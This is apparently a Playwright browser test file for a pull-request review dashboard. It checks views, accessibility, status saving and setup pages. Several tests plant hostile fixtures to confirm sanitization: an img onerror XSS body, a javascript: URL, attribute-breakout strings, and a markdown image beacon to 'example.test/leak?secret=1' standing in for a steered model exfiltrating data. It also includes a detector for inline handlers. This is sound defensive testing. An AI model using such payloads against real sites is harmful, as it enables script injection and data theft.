"""Drive the real pages in a headless browser: they load without script errors and the main interactions work.

Marked ``browser``; skipped when Playwright or a Chromium-family browser isn't available.
"""

import datetime as dt
import json
import os
import threading
from pathlib import Path
from types import SimpleNamespace

import pytest
from conftest import PROFILE_PATH, REPO, SLUG

from readthrough import ledger, study
from readthrough.build import build, render_html
from readthrough.config import Config
from readthrough.serve import Dashboard, DashboardServer

sync_api = pytest.importorskip("playwright.sync_api")
expect = sync_api.expect
pytestmark = pytest.mark.browser

BODY = 'Adds **retries** to the transport.\n\n- one\n- two\n\n<img src="data:," onerror="window.pwned=1">'


@pytest.fixture(scope="module")
def browser():
    with sync_api.sync_playwright() as p:
        launched = None
        for options in ({"channel": "msedge"}, {"channel": "chrome"}, {}):
            try:
                launched = p.chromium.launch(headless=True, **options)
                break
            except sync_api.Error:
                continue
        if launched is None:
            # The hosted runners ship Chrome and Edge; a silent skip there would hide a regression.
            if os.environ.get("CI"):
                pytest.fail("no Chromium-family browser on this runner; the browser tests must run on CI")
            pytest.skip("no Chromium-family browser available")
        yield launched
        launched.close()


@pytest.fixture
def server(tmp_path: Path, monkeypatch, make_pr, fake_forge):
    fake_forge.prs = [
        make_pr(number=1, body=BODY),
        make_pr(number=2, title="FEAT: other", author={"login": "me"}),
        make_pr(number=3, title="DOC: draft", isDraft=True),
    ]
    fake_forge.total = 40  # more open than fetched, so the "limit" banner shows
    monkeypatch.setenv("COPILOT_HOME", str(tmp_path / "copilot"))
    monkeypatch.setattr("readthrough.build.registered_protocol_command", lambda: None)
    cfg = Config(home=tmp_path / "home", repo=REPO, onboarded="2026-10-01T00:00:00+00:00")
    cfg.home.mkdir(parents=True)
    (cfg.home / "config.toml").write_text(
        f'[[repos]]\nname = "{REPO}"\nonboarded = "{cfg.onboarded}"\n', encoding="utf-8"
    )
    cfg.local_profile_path.parent.mkdir(parents=True)
    cfg.local_profile_path.write_text(PROFILE_PATH.read_text(encoding="utf-8"), encoding="utf-8")
    build(cfg, with_diffs=False)
    _seed_study_log(cfg)
    dashboard = Dashboard(cfg, with_diffs=False)
    assert dashboard.load()
    httpd = DashboardServer([dashboard], 0)
    dashboard.token = httpd.token
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    server_fixture.cfg = cfg  # for tests that write behind the page's back
    yield f"http://127.0.0.1:{httpd.server_address[1]}"
    httpd.shutdown()
    httpd.server_close()


server_fixture = SimpleNamespace(cfg=None)  # what the server fixture built, for the page fixture to hand on


def _seed_study_log(cfg: Config) -> None:
    """#2 has been studied a little: a prediction, a turn that failed, and a question answered only partly."""
    study.append(cfg, 2, "prediction", by="you", text="Touches the transport only.")
    study.append(cfg, 2, "chat", by="you", role="user", text="Quiz me.")
    study.append(
        cfg,
        2,
        "failure",
        by=study.TOOL,
        assistant="model",
        runtime="openai",
        text="git merge-base failed: shallow clone",
    )
    study.append(cfg, 2, "chat", by="you", role="user", text="Quiz me.")
    study.append(
        cfg, 2, "question", by="model", runtime="openai", question="Why does the retry **stop** at 3?", focus="intent"
    )
    study.append(cfg, 2, "answer", by="you", qid="Q1", text="Because the limit says so.")
    study.append(
        cfg,
        2,
        "assessment",
        by="model",
        runtime="openai",
        model="gpt-4.1",
        qid="Q1",
        verdict="partial",
        feedback="Name the limit.",
    )


@pytest.fixture
def page(browser, server):
    context = browser.new_context(viewport={"width": 1400, "height": 900})
    page = context.new_page()
    errors: list[str] = []
    refused: list[str] = []

    def on_console(msg) -> None:
        if msg.type != "error":
            return
        # The content security policy refusing something is the policy working, and Chromium 156+ reports it even
        # for the sanitizer's own parse of a hostile description. Kept apart from script errors; whether the page's
        # markup itself carries anything the policy would refuse is checked directly by scanning the DOM.
        (refused if "Content Security Policy" in msg.text else errors).append(f"console: {msg.text}")

    page.on("pageerror", lambda exc: errors.append(f"pageerror: {exc}"))
    page.on("console", on_console)
    page.errors = errors  # type: ignore[attr-defined]
    page.refused = refused  # type: ignore[attr-defined]
    page.base = server  # type: ignore[attr-defined]
    page.cfg = server_fixture.cfg  # type: ignore[attr-defined]
    yield page
    context.close()


def open_dashboard(page):
    page.goto(f"{page.base}/r/{SLUG}/")
    page.wait_for_selector("#v-map.on")


def rows(page) -> list[int]:
    return [
        int(n) for n in page.eval_on_selector_all("#v-table tbody [data-open]", "els => els.map(e => e.dataset.open)")
    ]


def test_every_view_renders_without_script_errors(page):
    open_dashboard(page)
    for tab in ("plan", "overlap", "table", "map"):
        page.click(f'[data-tab="{tab}"]')
        page.wait_for_selector(f"#v-{tab}.on")
    assert page.errors == []


def test_a_link_naming_a_view_that_does_not_exist_opens_the_map(page):
    """The tab is read from the URL and used to pick a renderer; a prototype member's name must not be one."""
    for i, hash_ in enumerate(("constructor", "__proto__", "toString", "nope")):
        page.goto(f"{page.base}/r/{SLUG}/?load={i}#{hash_}?lanes=draft")  # a new query: a real load, not a hash hop
        page.wait_for_selector("#v-map.on")
        assert page.evaluate("state.tab") == "map"
        assert page.evaluate("location.hash").startswith("#map"), "the URL is corrected along with the view"
    assert page.errors == []


def test_warnings_from_the_build_are_shown(page):
    """A standing fact about a big repo (only the most active PRs are fetched) is in the header's count, with the
    explanation on hover, rather than a warning banner on every visit; the other warnings stay banners."""
    open_dashboard(page)
    assert "3 of 40 open" in page.inner_text("#meta")
    assert "most recently active of 40" in page.get_attribute("#meta span[title]", "title")
    assert "most recently active" not in page.inner_text("#banners")
    assert page.inner_text("#tabs").count("Architecture map") == 1, "the bold-width reservation isn't read as text"


def test_live_chip_has_space_and_tabs_keep_their_width(page):
    open_dashboard(page)
    chip, refresh = page.locator(".live-status").bounding_box(), page.locator("[data-refresh]").bounding_box()
    assert chip and refresh and refresh["x"] - chip["x"] - chip["width"] >= 8
    width = page.locator("#tabs").bounding_box()["width"]
    for tab in ("plan", "overlap", "table", "map"):
        page.click(f'[data-tab="{tab}"]')
        assert page.locator("#tabs").bounding_box()["width"] == pytest.approx(width, abs=0.05)
    # A session's live dot must not inherit the header chip's padding, height, or border.
    page.evaluate(
        "DATA.prs[0].sessions = [{active: true, updated: Date.now()/1000, agent_label: 'Copilot'}];"
        "state.tab = 'table'; render();"
    )
    dot = page.locator("#v-table .sess.live").bounding_box()
    assert dot and dot["width"] == dot["height"] == 8
    assert page.errors == []


def test_numeric_table_headers_and_values_align(page):
    open_dashboard(page)
    page.click('[data-tab="table"]')
    assert page.locator("th.num").all_text_contents() == ["#", "Age", "Idle", "±", "Files", "Est", "Prio ▼"]
    styles = page.eval_on_selector_all(
        "#v-table .num",
        "els => els.map(el => { const s = getComputedStyle(el);"
        "return [s.textAlign, s.fontVariantNumeric, s.whiteSpace]; })",
    )
    assert styles and all(style == ["right", "tabular-nums", "nowrap"] for style in styles)
    assert page.errors == []


def test_empty_components_share_a_row_and_stay_filterable(page):
    open_dashboard(page)
    assert page.locator("#v-map .brick").count() == 2, "only the transport and tests have matching PRs"
    row = page.locator(".empty-components:has([data-comp='api'])")
    assert row.locator('[data-comp="cli"]').count() == 1, "empty entry points share one compact row"
    assert row.bounding_box()["height"] <= 34
    component_ids = page.evaluate("DATA.components.map(c => c.id).sort()")
    assert (
        page.eval_on_selector_all("#v-map [data-comp]", "els => els.map(el => el.dataset.comp).sort()") == component_ids
    )
    api = page.locator('#v-map [data-comp="api"]')
    api.focus()
    api.press("Space")
    expect(api).to_have_attribute("aria-pressed", "true")
    expect(api).to_be_focused()
    expect(page.locator(".map-empty")).to_have_text("No PRs match these filters.")
    assert page.locator("#v-map [data-comp]").count() == len(component_ids), "nothing on the map disappears"
    api.press("Enter")
    expect(api).to_have_attribute("aria-pressed", "false")
    assert page.locator("#v-map .brick").count() == 2
    # Populated components are keyboard-reachable too, and keep focus after filtering.
    transport = page.locator('#v-map [data-comp="transports"]')
    transport.focus()
    transport.press("Enter")
    expect(transport).to_have_attribute("aria-pressed", "true")
    expect(transport).to_be_focused()
    transport.press("Space")
    expect(transport).to_have_attribute("aria-pressed", "false")
    assert page.errors == []


def test_live_freshness_is_in_the_chip_without_hiding_failures(page):
    open_dashboard(page)
    page.evaluate(
        "DATA.freshness = {stale_live_hours: 4, stale_snapshot_hours: 26};"
        "DATA.generated = new Date(Date.now() - 3 * 3.6e6).toISOString();"
        "LIVE.disconnected = false; LIVE.status = {}; header();"
    )
    expect(page.locator(".live-status")).to_have_text("live")
    page.evaluate("DATA.generated = new Date(Date.now() - 5 * 3.6e6).toISOString(); header();")
    expect(page.locator(".live-status")).to_have_text("stale · 5 h")
    assert "readthrough doctor" in page.locator(".live-status").get_attribute("title")
    assert page.locator("#banners .stale-data").count() == 0
    error = {"message": "forge is unreachable", "step": "pull requests", "id": "E123"}
    for disconnected, status, text in (
        (True, {"building": True, "error": error}, "offline"),
        (False, {"building": True, "error": error}, "refreshing"),
        (False, {"error": error}, "refresh failed"),
    ):
        page.evaluate("([off, s]) => { LIVE.disconnected = off; LIVE.status = s; header(); }", [disconnected, status])
        expect(page.locator(".live-status")).to_have_text(f"{text} · 5 h")
        assert "5 hours old" in page.locator(".live-status").get_attribute("title")
    assert "forge is unreachable" in page.inner_text("#banners"), "an actual refresh error stays prominent"
    assert page.errors == []


def test_snapshot_keeps_its_age_warning_and_browser_status(page):
    cfg = page.cfg  # type: ignore[attr-defined]
    payload = json.loads(cfg.data_path.read_text(encoding="utf-8"))
    payload["generated"] = (dt.datetime.now(dt.UTC) - dt.timedelta(hours=27)).isoformat()
    page.route(
        "**/snapshot",
        lambda route: route.fulfill(content_type="text/html", body=render_html(payload)),
    )
    page.goto(f"{page.base}/snapshot")
    page.wait_for_selector("#v-map.on")
    expect(page.locator(".stale-data")).to_contain_text("27 hours old")
    assert page.locator(".live-status").count() == 0
    page.click('[data-tab="table"]')
    page.click('#v-table [data-open="1"]')
    understood = page.get_by_role("button", name="Understood", exact=True)
    understood.click()
    expect(understood).to_have_attribute("aria-pressed", "true")
    page.reload()
    expect(understood).to_have_attribute("aria-pressed", "true")
    assert not cfg.ledger_path.exists(), "a snapshot saves only in this browser"
    page.evaluate("byNum[1].head = 'new-head'; render();")
    expect(page.get_by_role("button", name="To do", exact=True)).to_have_attribute("aria-pressed", "true")
    assert page.errors == []


def test_lane_pills_select_only_then_restore(page):
    open_dashboard(page)
    page.click('[data-tab="table"]')
    assert sorted(rows(page)) == [1, 2, 3]
    page.click('#lanes [data-lane="draft"]')
    assert rows(page) == [3]
    page.click('#lanes [data-lane="draft"]')
    assert sorted(rows(page)) == [1, 2, 3]
    # Ctrl-click is a right-click on macOS; the page accepts Ctrl, Cmd, or Shift as "add or remove one".
    page.click('#lanes [data-lane="draft"]', modifiers=["ControlOrMeta"])
    assert sorted(rows(page)) == [1, 2]
    assert page.errors == []


def test_the_drawer_renders_the_description_safely(page):
    open_dashboard(page)
    page.click('[data-tab="table"]')
    page.click('#v-table [data-open="1"]')
    page.wait_for_selector("body.drawer-open")
    html = page.inner_html("#drawer")
    assert "<strong>retries</strong>" in html and "<li>one</li>" in html
    assert "onerror" not in html
    assert page.evaluate("window.pwned") is None
    page.click("#close")
    page.wait_for_selector("body:not(.drawer-open)")
    assert page.errors == []


INLINE_HANDLERS = """() => {
  const bad = [];
  for (const el of document.querySelectorAll("*"))
    for (const a of el.attributes)
      if (/^on/i.test(a.name) || (/^(href|src|action|formaction|xlink:href)$/i.test(a.name) && /^\\s*javascript:/i.test(a.value)))
        bad.push(`${el.tagName.toLowerCase()}[${a.name}]`);
  return bad;
}"""


def test_the_markup_carries_no_inline_handlers_or_script_urls(page):
    """What the content security policy would refuse must not be in the page to begin with, hostile description
    and all: every view, the PR panel's three tabs, and the setup page."""
    open_dashboard(page)
    seen = []
    for tab in ("map", "plan", "overlap", "table"):
        page.click(f'[data-tab="{tab}"]')
        page.wait_for_selector(f"#v-{tab}.on")
        seen += page.evaluate(INLINE_HANDLERS)
    page.click('#v-table [data-open="1"]')
    page.wait_for_selector("body.drawer-open")
    for dtab in ("overview", "study", "brief"):
        page.click(f'[data-dtab="{dtab}"]')
        page.wait_for_timeout(150)
        seen += page.evaluate(INLINE_HANDLERS)
    page.goto(f"{page.base}/setup")
    page.wait_for_selector("#nav .ritem")
    seen += page.evaluate(INLINE_HANDLERS)
    assert seen == []
    assert page.errors == []


def test_model_text_renders_without_images_while_a_description_keeps_its_screenshots(page):
    """An image URL is a way for a steered model to send data out; a PR author's screenshot is content."""
    _open_study(page, 2)
    page.evaluate(
        """() => {
          byNum[2].body = 'Before and after:\\n\\n![shot](https://example.test/shot.png)';
          study[2].entries.push({id: 99, ts: 'now', kind: 'chat', by: 'model', role: 'assistant',
                                 text: 'Look: ![beacon](https://example.test/leak?secret=1) and **bold**'});
          renderDrawer();
        }"""
    )
    assert page.locator("#drawer .transcript img").count() == 0, "nothing a model wrote loads an image"
    assert page.locator("#drawer .transcript strong", has_text="bold").count() == 1, "the rest still renders"
    page.click('[data-dtab="overview"]')
    assert page.get_attribute("#drawer .desc img", "src") == "https://example.test/shot.png"
    assert page.errors == []


def test_strings_from_the_forge_and_the_profile_stay_inside_their_attributes(page):
    """Check names, PR and check URLs, instruction URLs, and the profile's author badges are third-party text.
    CSP would stop a script either way; this is about the markup staying what the page meant."""
    hostile = 'lint" data-pwned="1'
    page.goto(f"{page.base}/r/{SLUG}/#table")
    page.wait_for_selector("#v-table.on")
    page.evaluate(
        """name => {
          const p = byNum[2];
          p.url = 'javascript:alert(1)';
          p.ci_state = 'failing';
          p.ci_checks = {passed: 0, pending: 0, cancelled: 0, required_missing: [], required_known: true,
                         failing: [{name, required: true, on_main: false, url: 'https://ci/x" data-pwned="2'}]};
          DATA.instructions = [{name: 'rules', url: 'https://docs/" data-pwned="3'}]; p.rules = ['rules'];
          PROFILE.author_kinds[p.author_kind].badge = 'kind" data-pwned="4';
          render(); openDrawer(2);
        }""",
        hostile,
    )
    row = page.locator('#v-table tr:has([data-open="2"])')
    assert page.locator("[data-pwned]").count() == 0
    assert row.locator("td.num a").get_attribute("href") == "", "a non-web URL links nowhere"
    assert row.locator(".cib").get_attribute("title").endswith(hostile + " (required)")
    assert page.get_attribute("#drawer .checks a", "href") == 'https://ci/x" data-pwned="2', "escaped, not mangled"
    assert page.get_attribute("#drawer h2 a", "href") == ""
    assert 'kind" data-pwned="4' in row.locator(".who").inner_text()
    assert page.errors == []


def test_drawer_copy_actions_use_a_keyboard_reachable_disclosure(page):
    page.context.grant_permissions(["clipboard-read", "clipboard-write"])
    open_dashboard(page)
    page.click('[data-tab="table"]')
    page.click('#v-table [data-open="1"]')
    summary = page.locator(".action-menu summary")
    expect(summary).to_have_attribute("aria-label", "More review actions")
    positions = (
        page.locator("#drawer .actions")
        .first.locator(":scope > .btn, summary")
        .evaluate_all("els => els.map(el => el.getBoundingClientRect().top)")
    )
    assert max(positions) - min(positions) <= 1, "the main actions fit on one row at the default width"
    # At the panel's minimum width the row may wrap where the system font is wide (Linux), but nothing overflows
    # and the menu stays in reach.
    page.evaluate("document.documentElement.style.setProperty('--drawer-w', '380px')")
    assert page.evaluate(
        """(() => { const body = document.querySelector('#drawer .dbody').getBoundingClientRect();
          return [...document.querySelectorAll('#drawer .review-actions > .btn, #drawer .review-actions summary')]
            .every(el => el.getBoundingClientRect().right <= body.right + 0.5); })()"""
    ), "no action is pushed past the panel's edge"
    expect(summary).to_be_in_viewport()
    page.evaluate("document.documentElement.style.removeProperty('--drawer-w')")
    assert page.get_by_role("button", name="Copy prompt", exact=True).count() == 0, "hidden until asked for"
    summary.focus()
    summary.press("Enter")
    expect(page.locator(".action-menu")).to_have_attribute("open", "")
    page.keyboard.press("Tab")
    expect(page.get_by_role("button", name="Copy prompt", exact=True)).to_be_focused()
    page.evaluate("render()")
    expect(page.locator(".action-menu")).to_have_attribute("open", "")
    expect(page.get_by_role("button", name="Copy prompt", exact=True)).to_be_focused()
    page.keyboard.press("Escape")
    expect(summary).to_be_focused()
    assert page.locator("body.drawer-open").count() == 1, "Escape closes the menu before the drawer"
    summary.press("Enter")
    page.get_by_role("button", name="Copy prompt", exact=True).click()
    expect(page.locator("#toast")).to_contain_text("Prompt copied")
    assert page.evaluate("navigator.clipboard.readText()").startswith(f"[readthrough:{SLUG}#1]")
    assert page.locator(".action-menu[open]").count() == 0
    summary.click()
    page.get_by_role("button", name="Copy worktree cmd", exact=True).click()
    expect(page.locator("#toast")).to_have_text("Copied")
    assert page.evaluate("navigator.clipboard.readText()") == "readthrough worktree 1"
    summary.click()
    page.locator("#drawer h2").click()
    assert page.locator(".action-menu[open]").count() == 0, "clicking outside closes it"
    page.evaluate("() => { navigator.clipboard.writeText = async () => { throw new Error('permission denied'); }; }")
    summary.click()
    page.get_by_role("button", name="Copy prompt", exact=True).click()
    expect(page.locator("#toast")).to_have_text("Couldn't copy: permission denied")
    assert page.errors == []


def test_drawer_status_pills_save_every_status_and_keep_ledger_context(page):
    cfg = page.cfg  # type: ignore[attr-defined]
    ledger.record(cfg.ledger_path, 1, note="Check the timeout.", session="existing-session")
    open_dashboard(page)
    page.click('[data-tab="table"]')
    page.click('#v-table [data-open="1"]')
    labels = ["Understood", "Reviewed", "Commented", "Approved", "Changes requested", "Skipped"]
    group = page.get_by_role("group", name="Your status for #1")
    assert group.get_by_role("button").count() == 7 and page.locator("#drawer select.status").count() == 0
    head = page.evaluate("byNum[1].head")
    for status, label in zip(ledger.STATUSES, labels, strict=True):
        button = group.get_by_role("button", name=label, exact=True)
        button.focus()
        button.press("Enter")
        expect(button).to_have_attribute("aria-pressed", "true")
        expect(group).to_have_attribute("aria-busy", "false")
        expect(button).to_be_focused()
        entry = ledger.load(cfg.ledger_path)["1"]
        assert entry["status"] == status and entry["head"] == head
        assert entry["note"] == "Check the timeout." and entry["session"] == "existing-session"
    page.reload()
    expect(group.get_by_role("button", name="Skipped", exact=True)).to_have_attribute("aria-pressed", "true")
    group.get_by_role("button", name="To do", exact=True).click()
    expect(group).to_have_attribute("aria-busy", "false")
    expect(group.get_by_role("button", name="To do", exact=True)).to_have_attribute("aria-pressed", "true")
    assert ledger.load(cfg.ledger_path)["1"] == {"note": "Check the timeout.", "session": "existing-session"}
    group.get_by_role("button", name="Reviewed", exact=True).click()
    expect(group).to_have_attribute("aria-busy", "false")
    expect(group.get_by_role("button", name="Reviewed", exact=True)).to_have_attribute("aria-pressed", "true")
    page.evaluate("byNum[1].head = 'new-head'; render();")
    expect(group.get_by_role("button", name="To do", exact=True)).to_have_attribute("aria-pressed", "true")
    assert ledger.load(cfg.ledger_path)["1"]["head"] == head, "a new head resets the display, not the record"
    assert page.errors == []


def test_status_saves_cannot_race_and_failures_are_not_shown_as_saved(page):
    open_dashboard(page)
    page.click('[data-tab="table"]')
    page.click('#v-table [data-open="1"]')
    page.click('[data-tab="plan"]')
    group = page.get_by_role("group", name="Your status for #1")
    held = []
    page.route("**/api/ledger/1", lambda route: held.append(route))
    group.get_by_role("button", name="Reviewed", exact=True).click()
    expect(group).to_have_attribute("aria-busy", "true")
    expect(page.locator('#v-plan select[data-status="1"]')).to_be_disabled()
    for button in group.get_by_role("button").all():
        expect(button).to_have_attribute("aria-disabled", "true")
    group.get_by_role("button", name="Approved", exact=True).dispatch_event("click")
    expect(group.get_by_role("button", name="To do", exact=True)).to_have_attribute("aria-pressed", "true")
    assert len(held) == 1, "a second click must not send another save"
    held[0].continue_()
    expect(group.get_by_role("button", name="Reviewed", exact=True)).to_have_attribute("aria-pressed", "true")
    expect(group).to_have_attribute("aria-busy", "false")
    page.unroute("**/api/ledger/1")
    page.route(
        "**/api/ledger/1",
        lambda route: route.fulfill(status=503, content_type="application/json", body='{"error":"disk is full"}'),
    )
    group.get_by_role("button", name="Approved", exact=True).click()
    expect(page.locator("#toast")).to_have_text("Couldn't save your status: disk is full")
    expect(group).to_have_attribute("aria-busy", "false")
    expect(group.get_by_role("button", name="Reviewed", exact=True)).to_have_attribute("aria-pressed", "true")
    expect(page.locator('#v-plan select[data-status="1"]')).to_have_value("reviewed")
    page.unroute("**/api/ledger/1")
    group.get_by_role("button", name="Approved", exact=True).click()
    expect(group.get_by_role("button", name="Approved", exact=True)).to_have_attribute("aria-pressed", "true")
    assert all("Failed to load resource" in msg and "503" in msg for msg in page.errors), page.errors


def test_theme_button_cycles_and_remembers(page):
    open_dashboard(page)
    seen = set()
    for _ in range(3):
        page.click("#theme")
        seen.add(page.evaluate("document.documentElement.dataset.theme"))
    assert {"light", "dark"} <= seen
    stored = page.evaluate("localStorage.getItem('readthrough:theme')")
    page.reload()
    page.wait_for_selector("#v-map.on")
    assert page.evaluate("localStorage.getItem('readthrough:theme')") == stored


def test_setup_page_loads_and_lists_the_repo(page):
    page.goto(f"{page.base}/setup")
    page.wait_for_selector("#nav .ritem")
    assert REPO in page.inner_text("#nav")
    assert page.errors == []


def test_onboarding_access_details_fold_without_losing_auth_transparency(page):
    page.goto(f"{page.base}/setup")
    details = page.locator("#w-access")
    expect(details.locator("summary")).to_contain_text("Read-only access to GitHub")
    assert details.get_attribute("open") is None
    details.locator("summary").focus()
    details.locator("summary").press("Enter")
    expect(details).to_have_attribute("open", "")
    # The toggle event that records the open state is dispatched asynchronously; wait for the record, not the
    # attribute, before a re-render reads it.
    page.wait_for_function("() => S.w && S.w.accessOpen === true")
    expect(details).to_contain_text("gh CLI")
    expect(details).to_contain_text("gh account you pick here")
    page.select_option("#w-forge", "ado")
    expect(details).to_have_attribute("open", "")
    expect(details).to_contain_text("Azure DevOps REST API")
    text = details.inner_text()
    assert text.index("AZURE_DEVOPS_EXT_PAT") < text.index("else az") < text.index("else anonymously")
    assert "never prompts" in text and "never stores a token or prompts you to sign in" in text
    page.route(
        "**/api/setup/inspect",
        lambda route: route.fulfill(
            content_type="application/json",
            body=json.dumps(
                {
                    "full_name": "org/Team/repo",
                    "slug": "ado/org/Team/repo",
                    "forge_label": "Azure DevOps",
                    "private": True,
                    "default_branch": "main",
                    "description": "",
                    "auth": "az, tenant-scoped",
                    "clone": "",
                    "source": None,
                    "profile_text": "",
                    "onboarded": False,
                }
            ),
        ),
    )
    page.fill("#w-repo", "org/Team/repo")
    page.get_by_role("button", name="Check access", exact=True).click()
    expect(page.locator(".msg.ok")).to_contain_text("Read as az, tenant-scoped.")
    expect(details).to_have_attribute("open", "")
    details.locator("summary").press("Space")
    expect(details).not_to_have_attribute("open", "")
    assert page.errors == []


def test_first_run_keeps_the_repo_field_and_connection_details_in_reach(page):
    state = page.request.get(f"{page.base}/api/setup/state").json()
    state.update(repos=[], repo=None)
    page.route(
        "**/api/setup/state*",
        lambda route: route.fulfill(content_type="application/json", body=json.dumps(state)),
    )
    page.goto(f"{page.base}/setup")
    expect(page.locator(".welcome")).to_contain_text("Welcome to readthrough")
    expect(page.locator("#w-repo")).to_be_focused()
    assert page.locator("#g-default").count() == 0
    assert page.locator("#w-access").get_attribute("open") is None
    assert page.errors == []


def test_pages_have_no_unfilled_placeholders(page):
    for path in (f"/r/{SLUG}/", "/setup"):
        page.goto(page.base + path)
        assert "/*__READTHROUGH_" not in page.content()


def test_study_tab_shows_failed_turns_and_takes_a_reflection(page):
    open_dashboard(page)
    page.click('[data-tab="table"]')
    page.click('#v-table [data-open="2"]')
    page.wait_for_selector("body.drawer-open")
    page.click('[data-dtab="study"]')
    page.wait_for_selector(".transcript")
    text = page.inner_text(".transcript")
    assert "The openai runtime didn't answer: git merge-base failed: shallow clone" in text, (
        "a failed turn is in the record, named by runtime"
    )
    assert "partial" in text
    # The transcript opens at its end, where the latest exchange and the composer are.
    assert page.evaluate(
        "(() => { const b = document.querySelector('#drawer .dbody'); return b.scrollHeight - b.scrollTop - b.clientHeight < 80; })()"
    )
    page.fill("#drawer textarea", "I never looked up the limit.")
    page.click('[data-study-add="reflection"]')
    page.wait_for_selector(".bubble.you .tag:has-text('what I missed on Q1')")
    assert "I never looked up the limit." in page.inner_text(".transcript")
    assert page.evaluate("document.querySelector('#drawer textarea').value") == ""
    assert page.query_selector('[data-study-add="reflection"]') is not None, "another note is still possible"
    assert page.errors == []


def _open_study(page, number: int) -> None:
    open_dashboard(page)
    page.click('[data-tab="table"]')
    page.click(f'#v-table [data-open="{number}"]')
    page.wait_for_selector("body.drawer-open")
    page.click('[data-dtab="study"]')
    page.wait_for_selector(".transcript")


def test_after_a_gap_the_page_fetches_what_it_holds_again(page, server):
    """Events are notifications: whatever the page missed while its stream was down (or overflowed), a resync
    brings the open study log up to date and clears a reply bubble whose `done` never arrived, so the composer
    isn't left disabled for good."""
    _open_study(page, 2)
    cfg = page.cfg  # type: ignore[attr-defined]
    # Written behind the page's back, as a terminal would; and a bubble left over from an interrupted stream.
    study.append(cfg, 2, "note", by="you", text="Appended while the stream was down.")
    page.evaluate("study[2].pending = {text: 'half a reply', tools: []}; renderDrawer();")
    assert page.is_disabled('[data-ask="quiz"]'), "a pending reply disables the composer"
    page.evaluate("resync()")
    page.wait_for_selector(".event:has-text('Appended while the stream was down.')")
    assert page.evaluate("study[2].pending") is None, "the server says no turn is running, so nothing is pending"
    assert not page.is_disabled('[data-ask="quiz"]')
    assert page.errors == []


def test_a_failed_stream_clears_the_reply_bubble_and_says_why(page):
    _open_study(page, 2)
    page.evaluate("onStudyEvent({pr: 2, type: 'start', action: 'quiz', assistant: 'model'})")
    page.evaluate("onStudyEvent({pr: 2, type: 'delta', text: 'Let me look'})")
    assert "Let me look" in page.inner_text("#pending")
    page.evaluate("onStudyEvent({pr: 2, type: 'error', message: 'the provider timed out'})")
    assert page.query_selector("#pending") is None
    assert "the provider timed out" in page.inner_text("#toast")
    assert page.errors == []


def test_the_open_pr_vanishing_from_a_reload_closes_the_panel_cleanly(page):
    """A PR merged between builds disappears from the payload; a panel open on it closes instead of erroring."""
    _open_study(page, 2)
    page.evaluate("setData({...DATA, prs: DATA.prs.filter(p => p.number !== 2)}); render();")
    assert page.evaluate("document.body.classList.contains('drawer-open')") is False
    assert page.evaluate("state.sel") is None
    assert sorted(rows(page)) == [1, 3]
    assert page.errors == []
